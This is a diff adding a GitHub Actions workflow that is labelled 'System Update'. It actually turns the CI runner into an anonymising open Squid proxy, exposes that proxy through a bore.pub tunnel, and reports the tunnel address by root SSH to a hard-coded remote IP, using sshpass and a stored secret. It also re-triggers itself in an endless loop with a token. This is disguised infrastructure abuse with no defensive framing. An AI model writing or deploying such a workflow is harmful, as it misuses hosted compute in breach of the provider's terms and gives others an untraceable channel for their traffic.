@@ -1,0 +1,88 @@
+name: System Update
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'  # fallback, якщо ланцюжок перерветься
+
+concurrency:
+  group: system-update
+  cancel-in-progress: false
+
+jobs:
+  maintenance:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Install squid
+        run: sudo apt update && sudo apt install squid -y
+
+      - name: Config squid
+        run: |
+          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
+          http_port 3128
+          http_access allow all
+          forwarded_for off
+          via off
+          visible_hostname localhost
+          EOF'
+          sudo systemctl restart squid
+
+      - name: Install bore
+        run: |
+          curl -L https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz | tar xz
+          sudo mv bore /usr/local/bin/
+
+      - name: Start bore tunnel with retry
+        run: |
+          for i in {1..3}; do
+            echo "Attempt $i..."
+            bore local 3128 --to bore.pub > bore.log 2>&1 &
+            sleep 15
+            cat bore.log
+            BORE_URL=$(grep -o 'bore\.pub:[0-9]*' bore.log | head -1)
+            if [ -n "${BORE_URL}" ]; then
+              echo "Got tunnel: ${BORE_URL}"
+              break
+            fi
+            echo "Retrying..."
+          done
+
+      - name: Get address and upload
+        env:
+          VS: ${{ secrets.VS }}
+        run: |
+          BORE_URL=$(grep -o 'bore\.pub:[0-9]*' bore.log | head -1)
+      
+          if [ -z "${BORE_URL}" ]; then
+            echo "ERROR: No tunnel after retries"
+            exit 1
+          fi
+      
+          echo "Sync OK from MF (${BORE_URL##*:})"
+      
+          sudo apt install sshpass -y
+      
+          sshpass -p "${VS}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "
+            echo '${BORE_URL}' >> /var/www/html/git.txt
+            echo '=== REMOTE FILE ==='
+            ls -l /var/www/html/git.txt
+            # tail -n 5 /var/www/html/git.txt
+          "
+          
+      - name: Keep tunnel alive
+        run: sleep 600
+
+      - name: Wait before next run
+        if: success()
+        run: sleep 300
+
+      - name: Re-trigger next run
+        if: success()
+        env:
+          GH_TOKEN: ${{ secrets.PIT_TOKEN }}
+        run: |
+          gh workflow run "${{ github.workflow }}" \
+            --repo "${{ github.repository }}" \
+            --ref "${{ github.ref_name }}"
